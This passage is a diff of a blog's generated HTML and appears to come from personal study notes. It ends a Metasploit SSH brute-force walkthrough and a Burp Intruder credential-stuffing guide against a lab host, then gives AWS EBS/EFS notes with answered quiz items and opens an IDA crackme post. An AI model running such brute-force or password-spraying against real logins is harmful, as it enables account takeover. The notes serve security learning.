 sing-metasploit/basics/using-metasploit.html</span><br><span class="line">   RPORT             22                                 <span class="built_in">yes</span>       The target port</span><br><span class="line">   STOP_ON_SUCCESS   <span class="literal">false</span>                              <span class="built_in">yes</span>       Stop guessing when a credential works <span class="keyword">for</span> a host</span><br><span class="line">   THREADS           1                                  <span class="built_in">yes</span>       The number of concurrent threads (max one per host)</span><br><span class="line">   USERNAME          root                               no        A specific username to authenticate as</span><br><span class="line">   USERPASS_FILE                                        no        File containing <span class="built_in">users</span> and passwords separated by space, on</span><br><span class="line">                                                                  e pair per line</span><br><span class="line">   USER_AS_PASS      <span class="literal">false</span>                              no        Try the username as the password <span class="keyword">for</span> all <span class="built_in">users</span></span><br><span class="line">   USER_FILE                                            no        File containing usernames, one per line</span><br><span class="line">   VERBOSE           <span class="literal">false</span>                              <span class="built_in">yes</span>       Whether to <span class="built_in">print</span> output <span class="keyword">for</span> all attempts</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> threads  10</span><br><span class="line">threads =&gt; 10</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> verbose <span class="literal">true</span> </span><br><span class="line">verbose =&gt; <span class="literal">true</span></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="literal">true</span></span><br><span class="line">[*] <span class="built_in">exec</span>: <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 192.168.19.140:22 - Starting bruteforce</span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:admin&#x27;</span></span><br><span class="line">[!] No active DB -- Credential data will not be saved!</span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:123456&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:12345&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:123456789&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:password&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:iloveyou&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:princess&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:1234567&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:12345678&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:abc123&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:nicole&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:daniel&#x27;</span></span><br><span class="line">....</span><br></pre></td></tr></table></figure>
+
+<h3 id="Credential-Stuffing-and-Password-Spraying"><a href="#Credential-Stuffing-and-Password-Spraying" class="headerlink" title="Credential Stuffing and Password Spraying"></a><strong>Credential Stuffing and Password Spraying</strong></h3><ul>
+<li><a target="_blank" rel="noopener" href="https://addons.mozilla.org/zh-TW/firefox/addon/foxyproxy-standard/">https://addons.mozilla.org/zh-TW/firefox/addon/foxyproxy-standard/</a></li>
+</ul>
+<p><img src="/img/exploit_Untitled_6.png" alt="Untitled"></p>
+<ul>
+<li>開啟這個Proxy及Burp Suite攔截目標網站的登入訊息</li>
+</ul>
+<p><img src="/img/exploit_Untitled_7.png" alt="Untitled"></p>
+<ul>
+<li>burp suite intercept message send to Intruder</li>
+</ul>
+<p><img src="/img/exploit_Untitled_8.png" alt="Untitled"></p>
+<ul>
+<li>修改Attack type &gt; Pitchfork</li>
+</ul>
+<p><img src="/img/exploit_Untitled_9.png" alt="Untitled"></p>
+<ul>
+<li>寫入蒐集到的mail、passwd資訊</li>
+</ul>
+<p><img src="/img/exploit_Untitled_10.png" alt="Untitled"></p>
+<p><img src="/img/exploit_Untitled_11.png" alt="Untitled"></p>
+<ul>
+<li><p>開啟攻擊並進行帳號密碼爆破</p>
+<p>  <img src="/img/exploit_Untitled_12.png" alt="Untitled"></p>
+</li>
+<li><p>可以通過回應訊息內容進行過濾</p>
+</li>
+<li><p>開啟Intruder &gt; Option &gt; Grap - Match &gt; clear &gt; Paste</p>
+</li>
+<li><p>Attack &gt; Pause</p>
+<ul>
+<li>check box 有打勾表示網頁有顯示Grep - Match的內容，可以透過這快速知道登入情況</li>
+</ul>
+</li>
+</ul>
+<p><img src="/img/exploit_Untitled_13.png" alt="Untitled"></p>
+<p><img src="/img/exploit_Untitled_14.png" alt="Untitled"></p>
+<p><img src="/img/exploit_Untitled_15.png" alt="Untitled"></p>
+<ul>
+<li>通過這個方式去尋找可能有弱密碼的可能</li>
+<li>爆破需要時間，若大量發送可能會觸發防火牆告警</li>
+<li>通常需要帳號&#x2F;密碼表讓爆破可以嘗試的內容更多</li>
+</ul>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+  
+    <article id="post-EBS" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2024/12/21/EBS/" class="article-date">
+  	<time datetime="2024-12-21T12:32:07.081Z" itemprop="datePublished">2024-12-21</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/12/21/EBS/">
+        AWS EC2 Instance Storage
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="EBS-Volume-彈性塊存儲"><a href="#EBS-Volume-彈性塊存儲" class="headerlink" title="EBS Volume 彈性塊存儲"></a>EBS Volume 彈性塊存儲</h3><p><img src="/img/EBS.png" alt="Untitled"></p>
+<ul>
+<li>網路驅動器</li>
+<li>實例運行時將其連接到實例上</li>
+<li>實例即使終止，EBS也允許我們保留數據</li>
+<li>重新創建一個實例，並裝載到之前同一個EBS可以取回數據</li>
+<li>在CCP Level 一次只能裝載到一個實例</li>
+<li>創建EBS時，它將綁訂到特定的可用區域(AZ)<ul>
+<li>假設使用us-east-1a則無法連接到us-east-1b</li>
+<li>執行快照，則可以在不同的可用性區域之間移動Volume</li>
+</ul>
+</li>
+<li>每月提供30GB免費存儲類型的通用或SSD或磁性</li>
+<li>使用網路在實例跟EBS中通訊</li>
+<li>可快速地從EC2實例分離並連接到另一個實例</li>
+<li>需提前調配容量</li>
+<li>可為配置容量付費，如果希望獲得更好的性能或更大的容量</li>
+<li>長期存儲</li>
+</ul>
+<h3 id="EC2-Instance-Store-→-臨時存儲"><a href="#EC2-Instance-Store-→-臨時存儲" class="headerlink" title="EC2 Instance Store → 臨時存儲"></a>EC2 Instance Store → 臨時存儲</h3><p>如果需要更高性能的硬體磁碟，使用EC2 Instance Store</p>
+<p>連接到真實的硬體服務器</p>
+<p>使用EC2實例存儲實現更好的IO性能</p>
+<p>如果希望獲得極高的磁盤性能，可以選擇這方案</p>
+<p>如果停止或終止EC2實例，存儲將丟失</p>
+<p>如果有緩衝區、緩存、如果希望有臨時數據、臨時內容</p>
+<p>服務器發生故障，將面臨巨大損失的風險，連接到EC2實例的硬體也將發生故障</p>
+<p>全部責任是確保備份，並根據需要進行複製</p>
+<h3 id="終止時刪除"><a href="#終止時刪除" class="headerlink" title="終止時刪除"></a>終止時刪除</h3><p><img src="/img/EBS1.png" alt="Untitled"></p>
+<ul>
+<li>默認情況下，Delete on Termination 對於Root Volume 處於選中狀態<ul>
+<li>Root EBS Volume 將與被終止的實例一起刪除</li>
+</ul>
+</li>
+<li>對於新的EBS Volume ，此選項未處於選中狀態<ul>
+<li>任何其他連接的EBS Volume 都不會被刪除</li>
+</ul>
+</li>
+<li>如果希望終止實例時保留Root Volume，則可以禁用Root Volume 的Delete on Termination</li>
+</ul>
+<h3 id="EBS-Snapshots"><a href="#EBS-Snapshots" class="headerlink" title="EBS Snapshots"></a>EBS Snapshots</h3><ul>
+<li>EBS快照是EBS Volume 在任意時間點的備份</li>
+<li>不必將EBS Volume 從EC2實例中分離</li>
+<li>可以跨不同的可用性區域甚至跨不同的區域複製這些EBS快照</li>
+</ul>
+<p><img src="/img/EBS2.png" alt="Untitled"></p>
+<ul>
+<li><p>封存快照 Archive</p>
+<p>  <img src="/img/EBS3.png" alt="Untitled"></p>
+<ul>
+<li>快照移動到封存層</li>
+<li>成本最多可以降低75%</li>
+<li>恢復歸檔將需要24~72小時</li>
+</ul>
+</li>
+<li><p>回收站EBS快照 Recycle Bin</p>
+<ul>
+<li>如果刪除EBS Snapshots，不是永久刪除，會在Recycle Bin中</li>
+<li>可以從意外刪除中恢復<ul>
+<li>可以設置為一天到一年的保留時間</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>快速快照恢復 Fast Snapshot Restore (FSR)</p>
+<ul>
+<li>強制快照進行完全初始化，以便在第一次使用時沒有延遲</li>
+<li>如果快照很大，需要初始化EBS或需要快速從其中實例化出來</li>
+<li>需要花費大量資金</li>
+</ul>
+</li>
+</ul>
+<h3 id="EBS-Volume-Types"><a href="#EBS-Volume-Types" class="headerlink" title="EBS Volume Types"></a>EBS Volume Types</h3><p><img src="/img/EBS4.png" alt="Untitled"></p>
+<ul>
+<li>6 types<ul>
+<li>gp2&#x2F;gp3 (SSD)<ul>
+<li>平衡各種工作負載的價格和性能</li>
+<li>為了實現經濟高效的存儲延遲</li>
+<li>gp2<ul>
+<li>具有低延遲的經濟高效的存儲</li>
+<li>可將其用於系統引導Volume</li>
+<li>1GB~16TB不等</li>
+<li>有些較小的gp2 Volume 可以爆發到3000 IOPS</li>
+<li>Volume 的大小和IOPS關聯</li>
+<li>IOPS、吞吐量連接再一起無法單獨設置</li>
+<li>如果增加IOPS、Volume GB數，將獲得3個以上的IOPS，最高到16000 IOPS ⇒ 5334 GB(最大值)</li>
+</ul>
+</li>
+<li>gp3<ul>
+<li>新一代Volume</li>
+<li>可獨立設置IOPS和吞吐量</li>
+<li>提供了3000 IOPS的基線和每秒125MB的吞吐量</li>
+<li>可以將IOPS增加到16000</li>
+<li>吞吐量增加到每秒1000MB</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Provisioned IOPS (PIOPS SSD) Input&#x2F;Output Operations Per Second<ul>
+<li><p>用於需要維持IOPS性能的關鍵業務應用程式</p>
+</li>
+<li><p>需要大量的IOPS(可能超過16000的應用程式)</p>
+</li>
+<li><p>存儲性能和一致性非常敏感的數據工作負載</p>
+</li>
+<li><p>io1(4GiB-16GiB(最大可調配))</p>
+<ul>
+<li>對於Nitro EC2實例，最大PIOPS約為64000</li>
+<li>對於其他類型的實例，最大PIOPS約為32000</li>
+<li>可以獨立於存儲大小來增加調配的IOPS</li>
+</ul>
+</li>
+<li><p>io2 Block Express(4GiB-64TiB)</p>
+<ul>
+<li>Sub-millisecond 等級的延遲</li>
+<li>獲得大量的最大IOPS<ul>
+<li>256000 with an IOPS:GiB ratio of 1000:1</li>
+</ul>
+</li>
+<li>性能非常高的I&#x2F;O類型的Volume</li>
+</ul>
+</li>
+<li><p>支持EBS多連接功能</p>
+<p>  <img src="/img/EBS5.png" alt="Untitled"></p>
+<ul>
+<li>允許將相同的EBS Volume 連接到同一可用性區域中的多個EC2實例</li>
+<li>僅適用io1、io2系列的EBS Volume</li>
+<li>每個實例都將擁有對高性能Volume 的完全讀寫權限，意味著可以同時讀寫</li>
+<li>在clustered Linux Application(Teradata 或你的應用程式必須管理併發寫入操作) 將獲得更高的應用程式可用性</li>
+<li>僅在指定可用性區域中可用</li>
+<li>不允許將EBS Volume 從一個連接到另一個<ul>
+<li>多連接的另一個限制是一次<strong>最多可以連接16個EC2實例</strong></li>
+</ul>
+</li>
+<li>要使其正常工作，必須使用一個支持集群的文件系統<ul>
+<li>不同於XFS、EXT4</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>io1&#x2F;io2 Block Express (SSD)</p>
+<ul>
+<li>性能最高的SSD Volume</li>
+<li>用於任務關鍵型低延遲和高吞吐量工作負載</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Hard Disk Drives<ul>
+<li>不能是Boot Volume</li>
+<li>僅適用於以前類型的Volume</li>
+<li>125GiB - 16 TiB</li>
+<li>st1 (HDD)<ul>
+<li>經吞吐量優化的HDD</li>
+<li>適合大數據、數據倉庫、日誌處理</li>
+<li>最大吞吐量為每秒500MB&#x2F;s</li>
+<li>最大IOPS 為500</li>
+<li>為頻繁訪問的吞吐量密集型工作負載而設計的低成本HDD Volume</li>
+</ul>
+</li>
+<li>sc1 (HDD)<ul>
+<li>成本最低的HDD Volume</li>
+<li>設計用於訪問頻率較低的工作負載</li>
+<li>用於歸檔數據<ul>
+<li>不經常訪問的數據</li>
+</ul>
+</li>
+<li>當需要盡可能低的成本時可以使用它</li>
+<li>最大吞吐量為每秒250 MiB&#x2F;s</li>
+<li>最大IOPS為250</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>如何定義EBS Volume ?<ul>
+<li>考慮 Size |Throughput IOPS (I&#x2F;O Ops Per Sec)</li>
+</ul>
+</li>
+<li>通用SSD與預配置IOPS SSD(如果需要數據庫)與st1、sc1(如果需要高吞吐量和最低成本)</li>
+<li>如果想要獲得超過32000 IOPS，則需要具有io1 or io2的EC2 Nitro</li>
+</ul>
+<h3 id="EBS-Encryption"><a href="#EBS-Encryption" class="headerlink" title="EBS Encryption"></a>EBS Encryption</h3><ul>
+<li>當創建並加密EBS Volume 時<ul>
+<li>Volume 中的靜態數據被加密</li>
+<li>實例和Volume 之間傳輸的所有數據都被加密</li>
+<li>所有快照都將被加密</li>
+<li>從快照創建的所有Volume 都將被加密</li>
+</ul>
+</li>
+<li>所有加密和解密機制都透明的處理<ul>
+<li>一切都由EC2和EBS在後台處理</li>
+</ul>
+</li>
+<li>對延遲的影響非常小</li>
+<li>利用了KMS(AES-256)的密鑰</li>
+<li>Copy 未加密的快照時，就啟用了加密</li>
+<li>如何加密未加密的EBS Volume<ul>
+<li>創建該Volume 的EBS快照</li>
+<li>複製功能加密EBS快照</li>
+<li>從快照創建一個新的EBS Volume</li>
+<li>該Volume 也將被加密</li>
+<li>將加密的 Volume 連接到原始實例</li>
+</ul>
+</li>
+</ul>
+<h3 id="AMI-Amazon-Machine-Image"><a href="#AMI-Amazon-Machine-Image" class="headerlink" title="AMI &gt; Amazon Machine Image"></a>AMI &gt; Amazon Machine Image</h3><p><img src="/img/EBS6.png" alt="Untitled"></p>
+<ul>
+<li>可以使用AWS創建的AMI</li>
+<li>自訂義自己的AMI<ul>
+<li>自己的軟體配置</li>
+<li>定義和設置操作系統</li>
+<li>設定監控工具</li>
+<li>獲得更快的啟動時間和配置時間</li>
+</ul>
+</li>
+<li>針對特定區域構建<ul>
+<li>可跨區域複製</li>
+</ul>
+</li>
+<li>可從不同類型的AMI啟動EC2實例</li>
+<li>可以從AWS Marketplace AMI啟動EC2實例<ul>
+<li>由其他人創建的AMI</li>
+<li>可能由其他人銷售</li>
+<li>也可以自己在AWS市場上創建一個銷售AMI的業務</li>
+</ul>
+</li>
+<li>AMI Process<ul>
+<li>啟動一個EC2實例並對其自訂義</li>
+<li>停止實例確保數據完整性正確</li>
+<li>根據實例構建AMI，這樣還可以在後台創建EBS快照</li>
+<li>從其他AMI啟動實例</li>
+</ul>
+</li>
+</ul>
+<h3 id="EFS-彈性文件系統-Elastic-File-System-Service"><a href="#EFS-彈性文件系統-Elastic-File-System-Service" class="headerlink" title="EFS 彈性文件系統 Elastic File System Service"></a>EFS 彈性文件系統 Elastic File System Service</h3><p><img src="/img/EBS7.png" alt="Untitled"></p>
+<ul>
+<li><p>託管NFS (Network file system)</p>
+</li>
+<li><p>網路文件系統</p>
+</li>
+<li><p>可以掛載到許多EC2實例上</p>
+<ul>
+<li>EC2可以位於不同的可用性區域</li>
+</ul>
+</li>
+<li><p>高度可用，可自動擴展，昂貴</p>
+</li>
+<li><p>按使用量付費</p>
+<ul>
+<li>用於EFS中的每GB數據</li>
+</ul>
+</li>
+<li><p>不必提前配置容量</p>
+</li>
+<li><p>內容管理、web 服務、數據共享、Wordpress</p>
+</li>
+<li><p>內部使用NFSv4.1 協議</p>
+</li>
+<li><p>為了控制EFS的訪問，需要設置安全群組</p>
+</li>
+<li><p>只兼容基於Linux的AMI，而不是Windows</p>
+</li>
+<li><p>使用KMS在EFS驅動器中啟用靜態加密</p>
+</li>
+<li><p>它是Linux上的標準文件系統，因此使用POSIX系統，具有標準文件API</p>
+</li>
+<li><p>EFS規模</p>
+<ul>
+<li>可以獲得數千個併發NFS客戶端和10GB+&#x2F;s吞吐量</li>
+<li>自動擴展到PB級的網路文件系統</li>
+</ul>
+</li>
+<li><p>創建EFS網路文件系統時設置<strong>性能模式</strong></p>
+<ul>
+<li>通用(默認)<ul>
+<li>延遲敏感的用例(WEB server, CMS..)</li>
+<li>最大化吞吐量<ul>
+<li>最大的I&#x2F;O</li>
+<li>高延遲的網路文件系統</li>
+<li>更高的吞吐量</li>
+<li>高度並行</li>
+<li>大數據應用程式或媒體處理需求</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>吞吐量模式</p>
+<p>  <img src="/img/EBS8.png" alt="Untitled"></p>
+<ul>
+<li>Bursting 爆裂<ul>
+<li>一個TB，每秒50MiB 加上每秒100MiB</li>
+</ul>
+</li>
+<li>Provisioned 資源調配<ul>
+<li>無論存儲大小如何都要設置吞吐量</li>
+<li>隨存儲容量的增加，前一個系統的吞吐量也在增長</li>
+<li>通過配置可以為1TB的存儲容量提供每秒1GB的吞吐量</li>
+</ul>
+</li>
+<li>Elsatic<ul>
+<li>根據工作負載自動調整吞吐量</li>
+<li>適合不可預測的工作負載</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>存儲類型</p>
+<ul>
+<li><p>生命週期管理功能</p>
+</li>
+<li><p>Standard : 允許在一定天數後將文件移動到不同的存儲層</p>
+<ul>
+<li>頻繁訪問的文件標準層</li>
+</ul>
+</li>
+<li><p>Infrequent access (EFS-IA):</p>
+<ul>
+<li>可以檢索文件</li>
+<li>存儲文件的成本低</li>
+<li>不頻繁訪問的EFS-IA層</li>
+</ul>
+</li>
+<li><p>Archive 歸檔存儲層:</p>
+<p>  <img src="/img/EBS9.png" alt="Untitled"></p>
+<ul>
+<li>針對很少訪問的數據</li>
+<li>數據存儲在該層上的成本低，50% cheaper</li>
+<li>要在存儲層之間自動移動文件，可以實施生命週期策略</li>
+<li>允許定義文件在多少天後應移動到哪個層</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>可用性和持久性方面</p>
+<ul>
+<li>Standard<ul>
+<li>當具有多個可用區設置</li>
+<li>EFS跨多個可用區</li>
+<li>生產工作負載非常有用</li>
+</ul>
+</li>
+<li>One Zone<ul>
+<li>只想進行開發並希望有更便宜的選擇</li>
+<li>可以選擇一個區域，將提供一個可用性區域，仍然可以在其中進行備份，並與IA類型的存儲層兼容(EFS One Zone-IA)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>通過使用正確的EFS存儲類型，可以節省高達90%的成本</p>
+</li>
+<li><p>EBS volumes</p>
+<p>  <img src="/img/EBS10.png" alt="Untitled"></p>
+<ul>
+<li>一次連接到一個實例<ul>
+<li>除了使用io1和io2類型volumes的多連接功能邊緣情況外</li>
+</ul>
+</li>
+<li>在AZ級別鎖定</li>
+<li>gp2<ul>
+<li>如果磁盤大小增加，IO將增加</li>
+</ul>
+</li>
+<li>gp3 &amp; io1<ul>
+<li>獨立於磁盤大小增加IO</li>
+</ul>
+</li>
+<li>要跨AZ遷移EBS，需要拍快照<ul>
+<li>將快照恢復到另一個AZ</li>
+<li>EBS volumes備份，將使用大量IO，不應該在應用程式處理大量流量時運行他們，因為可能影響性能</li>
+</ul>
+</li>
+<li>如果EC2被終止，實例的路由EBS volumes將默認被終止<ul>
+<li>可以禁用該行為</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>EFS volumes</p>
+<p>  <img src="/img/EBS11.png" alt="Untitled"></p>
+<ul>
+<li>網路文件系統</li>
+<li>目標是將其連接到可用性區域中的數百個實例</li>
+<li>對於一個EFS，可以在不同的AZ中擁有不同的掛載目標</li>
+<li>多個實例可以一起共享該文件系統</li>
+<li>只適用Linux(POSIX)</li>
+<li>EFS價位高於EBS，但可以利用存儲層節省成本</li>
+<li>對於實例存儲，它是物理連接到EC2實例的，因此如果失去了EC2實例，你也會失去存儲</li>
+</ul>
+</li>
+</ul>
+<p><strong>You have just terminated an EC2 instance in <code>us-east-1a</code>, and its attached EBS volume is now available. Your teammate tries to attach it to an EC2 instance in <code>us-east-1b</code> but he can’t. What is a possible cause for this?</strong></p>
+<ul>
+<li><input disabled="" type="checkbox"> • <strong>He’s missing IAM permissions</strong></li>
+<li><input disabled="" type="checkbox"> • <strong>EBS volumes are locked to an AWS Region</strong></li>
+<li><input checked="" disabled="" type="checkbox"> • <strong>EBS volumes are locked to an Availability Zone</strong></li>
+</ul>
+<p><strong>You have launched an EC2 instance with two EBS volumes, Root volume type and the other EBS volume type to store the data. A month later you are planning to terminate the EC2 instance. What’s the default behavior that will happen to each EBS volume?</strong></p>
+<ul>
+<li><input disabled="" type="checkbox"> • <strong>Both the root volume type and the EBS volume type will be deleted</strong></li>
+<li><input checked="" disabled="" type="checkbox"> • <strong>The Root volume type will be deleted and the EBS volume type will not be deleted</strong></li>
+<li><input disabled="" type="checkbox"> • <strong>The root volume type will not be deleted and the EBS volume type will be deleted</strong></li>
+<li><input disabled="" type="checkbox"> • <strong>Both the root volume type and the EBS volume type will not be deleted</strong></li>
+</ul>
+<p><strong>You can use an AMI in N. Virginia Region <code>us-east-1</code> to launch an EC2 instance in any AWS Region.</strong></p>
+<ul>
+<li><input disabled="" type="checkbox"> • <strong>True</strong></li>
+<li><input checked="" disabled="" type="checkbox"> • <strong>False</strong></li>
+</ul>
+<blockquote>
+<p>AMIs are built for a specific AWS Region, they’re unique for each AWS Region. You can’t launch an EC2 instance using an AMI in another AWS Region, but you can copy the AMI to the target AWS Region and then use it to create your EC2 instances.</p>
+</blockquote>
+<p><strong>Which of the following EBS volume types can be used as boot volumes when you create EC2 instances?</strong></p>
+<ul>
+<li><input disabled="" type="checkbox"> • <strong><code>gp2</code>, <code>gp3</code>, <code>st1</code>, <code>sc1</code></strong></li>
+<li><input checked="" disabled="" type="checkbox"> • <strong><code>gp2</code>, <code>gp3</code>, <code>io1</code>, <code>io2</code></strong></li>
+<li><input disabled="" type="checkbox"> • <strong><code>io1</code>, <code>io2</code>, <code>st1</code>, <code>sc1</code></strong></li>
+</ul>
+<p><strong>What is EBS Multi-Attach?</strong></p>
+<ul>
+<li><input disabled="" type="checkbox"> • <strong>Attach the same EBS volume to multiple EC2 instances in multiple AZs</strong></li>
+<li><input disabled="" type="checkbox"> • <strong>Attach multiple EBS volumes in the same AZ to the same EC2 instance</strong></li>
+<li><input checked="" disabled="" type="checkbox"> • <strong>Attach the same EBS volume to multiple EC2 instances in the same AZ</strong></li>
+</ul>
+<blockquote>
+<p>Using EBS Multi-Attach, you can attach the same EBS volume to multiple EC2 instances in the same AZ. Each EC2 instance has full read&#x2F;write permissions.</p>
+</blockquote>
+<ul>
+<li><input disabled="" type="checkbox"> • <strong>Attach multiple EBS volumes in multiple AZs to the same EC2 instance</strong></li>
+</ul>
+<p><strong>You would like to encrypt an unencrypted EBS volume attached to your EC2 instance. What should you do?</strong></p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> • <strong>Create an EBS snapshot of your EBS volume. Copy the snapshot and tick the option to encrypt the copied snapshot. Then, use the encrypted snapshot to create a new EBS volume</strong></li>
+<li><input disabled="" type="checkbox"> • <strong>Select your EBS volume, choose Edit Attributes, then tick the Encrypt using KMS option</strong></li>
+<li><input disabled="" type="checkbox"> • <strong>Create a new encrypted EBS volume, then copy data from your unencrypted EBS volume to the new EBS volume.</strong></li>
+<li><input disabled="" type="checkbox"> • <strong>Submit a request to AWS Support to encrypt your EBS volume</strong></li>
+</ul>
+<p><strong>You have a fleet of EC2 instances distributes across AZs that process a large data set. What do you recommend to make the same data to be accessible as an NFS drive to all of your EC2 instances?</strong></p>
+<ul>
+<li><input disabled="" type="checkbox"> • <strong>Use EBS</strong></li>
+<li><input checked="" disabled="" type="checkbox"> • <strong>Use EFS</strong></li>
+<li><input disabled="" type="checkbox"> • <strong>Use an Instance Store</strong></li>
+</ul>
+<p><strong>You would like to have a high-performance local cache for your application hosted on an EC2 instance. You don’t mind losing the cache upon the termination of your EC2 instance. Which storage mechanism do you recommend as a Solutions Architect?</strong></p>
+<ul>
+<li><input disabled="" type="checkbox"> • <strong>EBS</strong></li>
+<li><input disabled="" type="checkbox"> • <strong>EFS</strong></li>
+<li><input checked="" disabled="" type="checkbox"> • <strong>Instance Store</strong></li>
+</ul>
+<p><strong>You are running a high-performance database that requires an IOPS of 310,000 for its underlying storage. What do you recommend?</strong></p>
+<ul>
+<li><input disabled="" type="checkbox"> • <strong>Use an EBS <code>gp2</code> drive</strong></li>
+<li><input disabled="" type="checkbox"> • <strong>Use an EBS <code>io1</code> drive</strong></li>
+<li><input checked="" disabled="" type="checkbox"> • <strong>Use an EC2 Instance Store</strong></li>
+</ul>
+<blockquote>
+<p>You can run a database on an EC2 instance that uses an Instance Store, but you’ll have a problem that the data will be lost if the EC2 instance is stopped (it can be restarted without problems). One solution is that you can set up a replication mechanism on another EC2 instance with an Instance Store to have a standby copy. Another solution is to set up backup mechanisms for your data. It’s all up to you how you want to set up your architecture to validate your requirements. In this use case, it’s around IOPS, so we have to choose an EC2 Instance Store.</p>
+</blockquote>
+<ul>
+<li><input disabled="" type="checkbox"> • <strong>Use an EBS <code>io2</code> Block Express drive</strong></li>
+</ul>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+  
     <article id="post-C_Cpp" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1716,6 +2492,119 @@ z=2
 
 
   
+    <article id="post-Crackme2" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2024/12/21/Crackme2/" class="article-date">
+  	<time datetime="2024-12-21T12:32:07.079Z" itemprop="datePublished">2024-12-21</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/12/21/Crackme2/">
+        IDA - Crack me2
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Crack-me2"><a href="#Crack-me2" class="headerlink" title="Crack me2"></a>Crack me2</h1><p>使用IDA進行反編譯及創建結構</p>
+<p>執行檔案看看</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">remnux@remnux:~/Documents/crackme (1)/crackme$ ./crackme2</span><br><span class="line">enter key:dde</span><br><span class="line">enter serial:</span><br><span class="line">Wrong</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>原始碼</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line">struct Keybank &#123;</span><br><span class="line"></span><br><span class="line">	int key;</span><br><span class="line">	int serial;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">void <span class="function"><span class="title">success</span></span>()&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nCorrect\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void <span class="function"><span class="title">fail</span></span>()&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nWrong\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int <span class="function"><span class="title">main</span></span>() &#123;</span><br><span class="line">	int key = 0;</span><br><span class="line">	int serial = 0;</span><br><span class="line"></span><br><span class="line">	struct Keybank kb;</span><br><span class="line"></span><br><span class="line">  kb.key = 1337;</span><br><span class="line">	kb.serial = 1;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter key:&quot;</span>);</span><br><span class="line">	scanf(<span class="string">&quot;%d&quot;</span>, &amp;key);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter serial:&quot;</span>);</span><br><span class="line">	scanf(<span class="string">&quot;%d&quot;</span>, &amp;serial);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( key == kb.key &amp;&amp; serial == kb.serial) success();</span><br><span class="line">	<span class="keyword">else</span> fail();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>開啟IDA並反編譯</p>
+<p>View &gt; Open subviews&gt;Generate pseudocode</p>
+<p>快捷鍵 <code>F5</code> </p>
+<p><img src="/img/revcra2_Untitled.png" alt="Untitled"></p>
+<p>可以通過重新命名讓程式比較容易理解</p>
+<p>比如這邊是要求用戶輸入key → v4</p>
+<ul>
